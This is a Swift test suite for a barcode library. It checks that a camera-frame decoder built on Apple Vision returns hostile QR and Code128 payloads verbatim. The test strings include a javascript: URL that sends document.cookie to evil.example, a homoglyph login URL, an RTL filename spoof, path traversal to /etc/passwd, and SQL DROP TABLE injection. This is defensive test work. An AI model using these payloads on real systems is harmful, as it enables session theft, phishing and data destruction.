import CoreVideo
import Foundation
import PassesCore
import Testing

@testable import PassesBarcode

/// The hostile-payload half of the barcode-decode security suite for the **live-frame** path,
/// **re-baselined against Apple Vision on a `CVPixelBuffer`** (ADR `barcode-decode-1`, Deviation 1).
/// The still-image suite (``HostilePayloadFidelityTests``) proves the faithfulness contract for the
/// `CGImage` entry; this suite proves the SAME contract holds off a camera frame, whose Vision
/// binarizer runs over pixel-buffer luminance rather than a bounded still image.
///
/// The trust claim is identical: the symbol decode returns the payload EXACTLY as the symbol carried
/// it and never normalizes, truncates, or acts on it. Because the two entry points share one Vision
/// core (``VisionSymbolDecode``), a divergence here versus the still-image suite would be the frame
/// binarizer, not the roster or the result mapping — which is precisely why the corpus is re-run on
/// this path rather than assumed to carry over.
///
/// ## Re-baseline result
/// The corpus was run through the frame decoder and **every case round-trips verbatim** — RTL
/// override, zero-width/control chars, the Cyrillic homoglyph (Vision does NOT NFC/NFKC it), the
/// actionable schemes, SQL metacharacters, embedded newline/tab, and the oversize payload — matching
/// the still-image baseline. No expectation needed adjusting.
///
/// QR carries the Unicode-bearing cases (its byte/ECI mode is the only roster symbology that can);
/// Code128 covers the ASCII control/scheme cases to prove the contract is not QR-specific.
@Suite("FrameHostilePayloadFidelity")
struct FrameHostilePayloadFidelityTests {
    private let decoder = VisionBarcodeFrameDecoder()

    @Test func rtlOverrideIsReturnedVerbatim() async {
        await assertQrRoundTrips("invoice\u{202E}gnp.exe")
    }

    @Test func zeroWidthAndControlCharsAreReturnedVerbatim() async {
        await assertQrRoundTrips("WALT\u{200B}\u{200C}\u{200D}PASS\u{0007}")
    }

    @Test func homoglyphDomainIsReturnedVerbatim() async {
        // A Cyrillic 'а' (U+0430) spoofing Latin 'a'. Vision must not normalize it into the Latin
        // letter; the consumer needs the real codepoints to detect the punycode spoof.
        await assertQrRoundTrips("https://\u{0430}pple.com/login")
    }

    @Test func javascriptSchemeUrlIsReturnedVerbatim() async {
        await assertQrRoundTrips("javascript:fetch('https://evil.example/'+document.cookie)")
    }

    @Test func intentSchemeUrlIsReturnedVerbatim() async {
        await assertQrRoundTrips("intent://scan/#Intent;scheme=zxing;package=com.evil.app;S.payload=x;end")
    }

    @Test func customSchemeUrlIsReturnedVerbatim() async {
        await assertQrRoundTrips("walt://import?card=../../etc/passwd")
    }

    @Test func sqlMetacharactersAreReturnedVerbatim() async {
        await assertQrRoundTrips("'; DROP TABLE scannable_cards;--")
    }

    @Test func oversizedPayloadIsReturnedVerbatim() async {
        var long = ""
        for _ in 0..<800 { long += "AB7-" }
        await assertQrRoundTrips(long)
    }

    @Test func newlineAndTabWhitespaceIsReturnedVerbatim() async {
        await assertQrRoundTrips("LINE1\r\nLINE2\tTAB")
    }

    @Test func code128AsciiSchemePayloadIsReturnedVerbatim() async {
        await assertCode128RoundTrips("javascript:alert(1)")
    }

    @Test func code128SqlMetacharactersAreReturnedVerbatim() async {
        await assertCode128RoundTrips("1';--")
    }

    private func assertQrRoundTrips(_ payload: String) async {
        let frame = BarcodeFrameFactory.qrFrame(payload)
        #expect(await decoder.decode(frame: frame) == .decodedBarcode(payload: payload, format: .qr))
    }

    private func assertCode128RoundTrips(_ payload: String) async {
        let frame = BarcodeFrameFactory.code128Frame(payload)
        #expect(await decoder.decode(frame: frame) == .decodedBarcode(payload: payload, format: .code128))
    }
}
